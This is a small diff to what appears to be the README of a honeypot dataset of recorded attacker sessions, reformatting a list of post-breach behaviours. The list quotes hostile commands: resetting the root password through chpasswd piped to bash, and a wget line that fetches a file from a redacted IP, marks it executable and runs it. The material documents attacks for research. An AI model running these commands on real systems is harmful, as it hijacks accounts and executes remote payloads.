@@ -42,8 +42,10 @@ A total of 6,420 hacker keystroke sessions have been recorded following their br
 - **Probing Victim Host Information:** Gathering details such as IP address, OS version, installed software, CPU, memory, and disk size.
 - **Enabling All Services:** Activating all services on the victim host.
 - **Modifying Credentials:** Changing the root password or creating other root accounts. E.G.
-    - echo "root:ZYOYI3d9rSGq"|chpasswd|bash
-    - echo -e "new_password\nnew_password"|passwd|bash
+    ```bash
+    echo "root:ZYOYI3d9rSGq"|chpasswd|bash
+    echo -e "new_password\nnew_password"|passwd|bash
+    ```
 - **Downloading Files:** Using tools like `wget`, `ftp`, or `curl` to download files and attempting to execute them. E.G.
     -  wget http://[IP]:25770/.i; chmod 777 .i; ./.i
 - **Creating Binary Files:** Using echo hex code to create binary files and attempting to execute them. E.G.
